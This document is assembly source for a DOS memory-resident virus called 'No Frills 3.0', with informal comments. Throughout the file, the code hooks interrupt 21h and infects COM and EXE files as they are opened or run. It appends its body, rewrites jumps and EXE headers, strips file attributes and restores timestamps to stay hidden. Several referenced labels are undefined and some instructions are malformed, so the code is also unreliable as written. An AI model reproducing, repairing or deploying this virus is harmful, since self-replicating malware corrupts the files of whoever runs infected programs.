
;No Frills 3.0

;Note - This file was done by Buzzo, but due to him not having enough time
;to deal with it, i went through and commented a bit.. If you find any errors
;its most likely my fault... so ask him to correct it for you. =]

jump            equ     old_21h+4
size_save       equ     jump+3
infected        equ     size_save+4
temp_load       equ     infected+1
part_page       equ     temp_load+2
page_cnt        equ     part_page+2
header_size     equ     page_cnt+4
relo_ss         equ     header_size+4
exe_sp          equ     relo_ss+2
exe_ip          equ     exe_sp+4
relo_cs         equ     exe_ip+2
filename        equ     relo_cs+4

v_len           equ     old_21h-v_start


nf30    segment byte public
assume  cs:nf30, ds:nf30
org     100h



nf_30:

	jmp	v_start         ;3 byte stub for germ file

v_start:
	mov	di,100h         ;set di to the start of the COM
	mov	ax,20CDh        ;write CD20h (int 20h opcode)

two_byte        equ $-2

	stosw
	mov	al,0            ;write ascii zero

one_byte        equ $-2

	stosb
	call	delta           ;get delta offset

delta:
	pop     si                      ;pop ip off the stack
	sub	si,offset v_start       ;subtract offset of v_start
	mov	bp,ds                   ;get ds into bp
	mov	ax,5432h                ;check for residency
	int	21h
	cmp	ax,1007h        ;is it resident?
	ja      find_mem        ;if not, find some memory
	jmp	dispatch        ;else, dispatch the file

find_mem:
	mov	ax,ds           ;get PSP segment into dx
	dec	ax              ;decrement it (get MCB segment)
	mov	ds,ax           ;get MCB segment into ds

mem_loop:
	cmp	byte ptr [0],'Z'        ;last block?
        je      found_block             ;yes
	mov	bx,word ptr [3]         ;move block size into bx
	add	ax,bx           ;add it to ax
	inc	ax              ;increment ax to get MCB segment
	mov	ds,ax           ;put the next MCB's segment into ds
	jmp	short mem_loop  ;back to the start of the loop

found_block:
	mov	ds,ax                   ;get ax into ds (huh?)
	sub	word ptr[3],60h         ;adjust block size
	inc	ax                      ;increment ax
	add	ax,word ptr [3]         ;add the block size to ax
	push	cs
	pop	ds              ;set ds=cs
	sub	ax,10h          ;subtract 10h from ax
	mov	es,ax           ;get destination segment
	mov	di,100h         ;treat it as an offset address 100h
	mov	cx,400h         ;put 400h into cx (more than we need)
	add	si,100h         ;add 100h to delta offset
	rep	movsb           ;copy the virus to its destination
	xor	si,si           ;clear si
	push    ax                      ;push destination segment
	mov	ax,offset get_int21h
	push    ax                      ;push destination offset
	retf                            ;go there

	db      '+-NF3.0-H.McB-[PuKE]-+'         ;signature

itype   db      0       ;identification for COM/EXE host
                        ;0 for COM, 1 for EXE

get_int21h:
	mov	ax,3521h                ;get interrupt vector
	int	21h
	push	cs
	pop	ds                      ;set ds=cs
	mov	word ptr [old_21h],bx   ;save its offset
	mov	word ptr [old_21h+2],es	;save its segment
	mov	ax,2521h                ;set interrupt vector
	mov	dx,offset res_check     ;offset of new int21h = dx
	int	21h


dispatch:
	push	cs
	pop	ds              ;set ds=cs
	xor	ax,ax           ;clear those registers
	mov	bx,ax
	mov	cx,ax
	mov	dx,ax
	mov	di,ax
	mov	es,bp           ;move the segment of the PSP into es
	cmp	[si+itype],1    ;check what we're dealing with
	je	dispatch_EXE    ;if the identifier's 1, it's an EXE

dispatch_COM:
	mov	ds,bp           ;else, ds=es=PSP of host
	push	bp              ;push that segment
	mov	bp,100h         ;move 100h into bp
	push	bp              ;push that too
	mov	bp,ax           ;clear ax
	mov	si,ax           ;clear si
	retf                    ;return :-)

old_shit        db       8 dup (0)

dispatch_EXE:
	add	bp,10h              ;add 10h to bp
	add	si,offset old_shit
	lodsw                   ;get ss
	add	ax,bp
	xchg	bx,ax
	lodsw                    ;get sp
	mov	ss,bx            ;restore the stack
	mov	sp,ax
	lodsw                    ;get ip
	xchg	bx,ax
	lodsw                    ;get cs
	add	ax,bp
	sub	bp,10h
	push	ax               ;push cs onto the stack
	push	bx               ;push ip onto the stack
	mov	ds,bp            ;return ds = PSP
	xor	ax,ax            ;clear everything
	mov	bx,ax
	mov	bp,ax
	mov	si,ax
	retf                     ;return

res_check:      ;effectively this is the start of the int 21h handler

	cmp	ax,5432h        ;is it a check for residency?
	jne	int21h_handler  ;if not..
	mov	ax,1007h        ;else, set it to 1007h
	iret                    ;and return

int21h_handler:
	cmp	ah,4Bh          ;execute?
	je	letsgo
	cmp	ah,3Dh          ;open?
	je	letsgo
	cmp	ah,43h          ;attrib?
	je	letsgo
	cmp	ah,6Ch          ;ext. open/create?
	jne	return_21h      ;nope, return
	push	dx              ;save dx
	mov	dx,si           ;set ds:dx to point to the filename
	call	infect          ;call infect
	pop	dx              ;restore dx
	jmp	short return_21h

letsgo:
	call	infect

return_21h:
	jmp	dword ptr cs:[old_21h]  ;pass control to the old int 21h

int21h:
	pushf                           ;push flags
	call	dword ptr cs:[old_21h]  ;do a far call to the original addy
	ret


infect:
	pushf                   ;push everything
	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	bp
	push	ds
	push	es
	cmp	ah,4B           ;check if it's execution
	jne	not_exec
	xchg	bp,ax

not_exec:
	push	cs		
	pop	es                      ;set es=cs
	mov	di,offset filename      ;set di
	push	di                      ;save that
	mov	si,dx                   ;si=start of asciiz filename

copy_name:
	lodsb                   ;load one byte into al from ds:si
	stosb                   ;store it to es:di
	cmp	al,0            ;is it zero?
	jne	copy_name       ;if not, the asciiz string hasn't been copied
	push	cs
	pop	ds              ;set ds=cs
	pop	si              ;set si=offset filename
	mov	ax,3524h        ;get int 24h vector
	call	int21h
	push	bx              ;save its offset on the stack
	push	es              ;save its segment on the stack
	mov	ax,2524h        ;set int 24h vector
	mov	dx,offset @iret ;to a nice iret opcode
	call	int21h
	push	cs
	pop	es              ;set es=cs
	call	ext_check       ;check the file's extension
	jnc	get_attribs
	jmp	close_file      ;if it's not COM or EXE, bomb out

get_attribs:
	mov	dx,si           ;set ds:dx back to the file name
	mov	ax,4300h        ;get attributes
	call	int21h          ;save 'em on the stack
	jnc	set_attribs
	jmp	close_file     ;if something goes wrong..

set_attribs:
	push	cx              ;save attributes
	xor	cx,cx           ;clear 'em
	mov	ax,4301h        ;set them to clear
	call	int21h
	jnc	open_file       ;nothing's wrong?
	pop	cx              ;restore attributes to cx
	jmp	close_file

open_file:
	mov	ax,3D02h        ;open file read/write
	call	int21h
	mov	bp,ax           ;save file's handle in bp
	xchg	bx,ax           ;put handle into ax
	mov	ax,5700h        ;get file time and date
	call	int21h
	push	cx              ;save time
	push	dx              ;save date
	call	lseek_EOF       ;seek to EOF, file size in dx:ax
	cmp	ax,3            ;if ax<3, don't infect
	jb	jmp_close
	sub	ax,2E3h
	sbb	dx,0
	mov	cx,dx
	mov	dx,ax
	mov	ax,4200h        ;seek to start of file
	call	int21h
	mov	ah,3Fh          ;read in 2 bytes into temp_load
	mov	cx,2
	mov	dx,temp_load
	mov	si,dx           ;set si=temp_load
	call	int21h
	mov	di,si           ;set di=si
	lodsw
	cmp	ax,2D2Bh        ;huh?
	jne	check_ok
	xchg	si,ax
	stosw

jmp_close:
	jmp	time_attrib

check_type:
	cmp	[itype],0
	jne	exe_infection

com_infection:
	call	lseek_BOF       ;seek to file start
	mov	ah,3Fh          ;read in two bytes
	mov	cx,2
	mov	dx,offset two_bytes
	push	ax
	call	int21h
	dec	cx
	pop	ax
	add	dx,4
	call	int21h          ;read in one more byte into one_byte
	mov	al,0E9h         ;make jmp near opcode
	mov	di,jump
	mov	dx,di
	push	dx
	stosb                   ;put it in
	call	lseek_EOF       ;gets file size in dx:ax
	dec	ax
	dec	ax
	dec	ax              ;get displacement of jmp
	stosw                   ;put that in too :P
	mov	dx,100h         ;start of the virus in memory
	mov	cx,v_len        ;size of the virus
	mov	ah,40h          ;write it
	call	int21h
	call	lseek_BOF       ;go to the file start
	mov	ah,40h
	mov	cx,3
	pop	dx              ;the jump
	call	int21h          ;write that
	jmp	time_attrib     ;reset time and attributes

exe_infection:
	call	lseek_BOF
	mov	ah,3Fh          ;function  to read from file
	mov	cx,1Ch          ;read in 28 bytes from header
	mov	dx,temp_load    ;our buffer
	mov	si,dx
	mov	di,1AFh
	call	int21h
	lodsw
	cmp	ax,'ZM'         ;check to make sure its an exe file
	je	ef_ok
	cmp	ax,'MZ'
	je	ef_ok
	jmp	short com_infection       ;exe check failed, its a com

ef_ok:	
	add	si,0Ch
	movsw
	movsw
	inc	si
	inc	si
	movsw
	movsw

zend_file:
	call	lseek_EOF
	push	dx
	push	ax
	mov	ah,40h          ;function to write to file
	mov	cx,v_len        ;write our virus body
	mov	dx,100h         ;where the data to write is
	call	int21h
	call	lseek_EOF
	mov	word ptr [size_save],ax
	mov	word ptr [size_save+2],dx
	pop	ax
	pop	dx
	push	dx
	push	ax
	xor	bx,bx
	or	dx,dx
	jz	fix_ax
	xchg	dx,ax
	mov	dx,0FFFFh
	mul	dx
	mov	bx,10h
	div	bx
	inc	ax
	mov	bx,ax

fix_ax:	
	pop	ax
	pop	dx
	xor	dx,dx
	mov	cx,10h
	div	cx
	mov	cx,dx
	add	ax,bx
	sub	ax,word ptr [header_size]
	mov	word ptr [relo_cs],ax
	add	cx,0Ah
	mov	word ptr [exe_ip],cx
	add	cx,380h                   ;e_len
	mov	word ptr [relo_cs],ax
	mov	word ptr [exe_sp],cx
	mov	ax,word ptr[size_save]
	and	ax,1FFh
	mov	word ptr [part_pag],ax

	pushf
	mov	ax,word ptr [size_save+1]
	rcr	ax,1
	popf
	jz	put_cnt
	inc	ax

put_cnt:
	mov	word ptr [page_cnt],ax

write_hdr:
	call	lseek_BOF       ;go to the bof
	mov	cx,1Ch          ;holds number of bytes to write
	mov	dx,temp_load    ;the buffer that contains the header
	mov	ah,40h          ;function to write to file
	call	int21h

k_kewl:
	mov	byte ptr [infected],1

time_attrib:
	pop	dx              ;pop date
	pop	cx              ;pop time
	mov	ax,5701h        ;function to set files time/date stamp
	call	int21h
	mov	ah,3Eh          ;function to close the file
	call	int21h
	mov	ax,4301h        ;function to set file attributes
	pop	cx              ;pop the attribute
	mov	dx,49Fh
	call	int21h

close_file:
	mov	ah,3Eh          ;function to close the file .... again?
	call	int21h
	pop	ds
	pop	dx
	mov	ax,2524h        ;function to set interrupt vector
	call	int21h          ;restore the int 24h
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si             ;restore the registers
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	popf
	ret                    ;and return to our caller

@iret:
	iret                   ;exit our virus

ext_check:
	push	si
	mov	si,filename
	cld

k_zero:
	lodsb
	cmp	al,0
	jne	k_zero
	sub	si,4
	lodsw
	and	ax,0DFDFh
	cmp	ax,'XE'
	je	verify_EXE
	cmp	ax,'OC'
	je	verify_COM
	xchg	bp,ax
	cmp	ah,4Bh
	jne	bad_ext
	mov	[itype],1
	jmp	short good_ext

bad_ext:
	pop	si
	stc
	ret

verify_EXE:
	lodsb
	and	al,0DFh
	cmp	al,'E'                ;make sure its an exE file
	jne	bad_ext
	cmp	word ptr [si-0Bh],'CS'
	je	bad_ext
	cmp	word ptr [si-8],'CS'
	je	bad_ext
	mov	byte ptr [itype],1

good_ext:
	pop	si
	clc
	ret

verify_COM:
	lodsb
	and	al,0DFh
	cmp	al,'M'                ;make sure its a coM file
	jne	bad_ext
	mov	[itype],0
	pop	si
	ret


lseek_BOF:
	push	cx
	push	dx
	mov	ax,4200h                ;function to seek to the start of file
	mov	bx,bp                   ;bx should hold the file handle	
	xor	cx,cx                   ;offset from origin of new file position
	mov	dx,cx                   ;CX:DX = 0
	call	int21h
	pop	dx
	pop	cx
	ret

lseek_EOF:
	mov	ax,4202h                ;function to seek to the end of file
	mov	bx,bp                   ;bx should hold the file handle			
	xor	cx,cx                   ;offset from origin of new file position
	call	int21h
	ret

old_21h:

nf30	ends
	end	start
